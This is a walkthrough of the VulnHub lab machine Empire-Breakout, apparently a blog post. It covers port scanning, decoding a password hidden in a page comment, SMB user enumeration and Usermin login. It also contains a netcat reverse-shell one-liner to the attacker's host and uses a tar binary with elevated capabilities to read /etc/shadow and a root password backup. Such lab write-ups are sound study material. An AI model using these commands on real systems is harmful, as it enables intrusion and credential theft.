---
layout: post
title: Empire-Breakout
categories: VulnHub Machines
permalink: /vulnhub/empire-breakout
---

Author: Icex64 & Empire Cybersecurity

## Nmap

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 02:53 UTC
Nmap scan report for 192.168.56.135
Host is up (0.00092s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:A2:1E:2A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

Host script results:
| smb2-time: 
|   date: 2025-01-09T02:53:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -2s
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 192.168.56.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.84 seconds
```

## Port 80

![image1](https://github.com/user-attachments/assets/bd17d2ef-e799-4ea5-a5de-bad5e810d366)


We are greeted with the apache2 default page. Nothing too special on the page. Let’s look at the source code to see if we find anything.

### Source Code

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

-->
```

We can find the above comment hidden within the source code of the page. The weird looking string is encoded using the Brainf**k cipher. Decoding it we get the below string

```bash
.2uqPEfj3D<P'a-3
```

It seems this could be a password to an account. Let’s visit the other ports where we saw MiniServ running.

## Port 10000

![2](https://github.com/user-attachments/assets/033a6325-8e57-4b01-abd9-3563a2ccbd6f)


We are greeted with a login page. We can try to login with the password we obtained earlier. Using admin as the user with the password doesn’t work. This means that we need to look for a valid username.

If we look back at the nmap scan we can see that smb is running. We can use enum4linux to find valid users

## enum4linux

```bash
enum4linux -r 192.168.56.135
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan  9 03:10:36 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                            
Target ........... 192.168.56.135                                                                                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

<SNIP>                                                                                                                                                                        

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-22-1-1000 Unix User\cyber (Local User)                                                                                                                                                                                                  

<SNIP>

enum4linux complete on Thu Jan  9 03:10:49 2025
```

We can see that there is a local user with the username cyber. Let’s try using that as our username on the Webmin login page.

![3](https://github.com/user-attachments/assets/8275438b-88ba-4f0b-80f9-0b35da20197d)


Well, that didn’t work. There is another service Usernmin running on port 20000. We can check to see if the credentials work there.

![4](https://github.com/user-attachments/assets/95f7ce8d-5992-4189-9365-8eb3cf20fe7d)


And there we go, we are now logged in onto Usermin. We can now use the inbuilt terminal to run commands on the server.

![5](https://github.com/user-attachments/assets/2fac5282-770c-41d3-9c56-b40366344a92)


Let us get a more interactive shell by using netcat.

```bash
[cyber@breakout ~]$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.103 4242 >/tmp/f
```

![6](https://github.com/user-attachments/assets/5c5c8360-deb2-49c3-bc68-6a87da642b3b)


After getting a more interactive shell using python, we get the user.txt file.

Now time to escalate the privileges.

## Priv Esc

We can see that there is a binary for the tar program there. Which is likely our way to root.

![7](https://github.com/user-attachments/assets/4e44aa5b-bc81-44ce-a927-d46c094eb2d1)


My first thought was that maybe we have sudo as root on the tar binary. But sudo was disabled so we can’t do that.

We can use getcap to see what capabilities the binary has.

![9](https://github.com/user-attachments/assets/bc0bd0f1-c59b-435a-ab26-c15683ef1bfc)


The cap_dac_read_search capability allows us to bypass file read permissions.

We can try and see if we can read the /etc/shadow file.

![10](https://github.com/user-attachments/assets/fcd09e0a-03dd-4426-b0d3-97473c9f9a39)


And sure enough we can.

We can try and crack the hashes offline, but considering the password for cyber was complex, we can see if we have any other way.

Since we can read any file as root, we can look for interesting files owned by root in any of the usual places such as /var/backup or /opt.

![11](https://github.com/user-attachments/assets/fc7ac7d8-21e2-4950-8e56-79c736f14f7e)


Looking at /var/backup we can see a .old_pass.bak file which is readable only by root.

Let’s use out tar binary to read this file.

![12](https://github.com/user-attachments/assets/7775db6b-c588-418b-825a-0807ce461d86)


We seem to get a complex looking password.

Let’s try to su to root using this pass.

![13](https://github.com/user-attachments/assets/46e2d85e-986e-4b22-b607-195993c8424f)


And there we go, we finally have root

![14](https://github.com/user-attachments/assets/b4681ba9-e7c7-481b-b147-3fb6bb338079)

https://www.vulnhub.com/entry/empire-breakout,751/
